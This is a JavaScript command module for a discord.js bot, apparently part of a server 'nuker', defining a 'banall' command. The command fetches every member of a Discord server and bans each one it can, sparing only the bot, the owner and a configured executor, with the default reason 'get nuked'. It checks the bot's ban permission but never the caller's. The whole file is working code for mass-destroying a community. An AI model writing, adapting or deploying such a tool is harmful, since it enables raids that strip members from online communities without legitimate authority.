const { CommandInteraction, CommandInteractionOptionResolver, GuildMember, User, PermissionsBitField, ApplicationCommandOptionType } = require("discord.js");

module.exports = {
    name: `banall`,
    options: [
        {
            name: `reason`,
            description: `The ban reason`,
            type: ApplicationCommandOptionType.String,
            required: false
        }
    ],

    /**
     * 
     * @param {CommandInteraction} interaction 
     * @param {CommandInteractionOptionResolver} options 
     * @param {GuildMember} member 
     * @param {User} user 
     */

    async execute(interaction, options, member, user) {
        const { me } = interaction.guild.members;
        if(!me.permissions.has(PermissionsBitField.Flags.BanMembers)) return console.log(`[ERROR] I'm missing the permission BanMembers (1 << 2)! [${interaction.guild.name}]`);
        const members = await interaction.guild.members.fetch();
        members.forEach(async member => {
            if(member.id == me.id || (bot.cfg.executor.trim() != `` && bot.cfg.executor == member.id)) return;
            if(member.guild.ownerId == member.id) return console.log(`[BAN] Skipped ${member.user.tag} (${member.user.id}): Server owner`);
            if(member.roles.highest.position >= me.roles.highest.position) return console.log(`[BAN] Skipped ${member.user.tag} (${member.user.id}): Higher or same role`);
            if(!member.bannable) return console.log(`[BAN] Skipped ${member.user.tag} (${member.user.id}): Not bannable`);
            await member.ban({
                reason: options.getString(`reason`) || `get nuked [rappytv's nuker]`
            }).then(() => {
                return console.log(`[BAN] Banned ${member.user.tag} (${member.user.id})`);
            }).catch((err) => {
                return console.log(`[BAN] Failed to ban ${member.user.tag} (${member.user.id}): ${err}`);
            });
        });
    }
}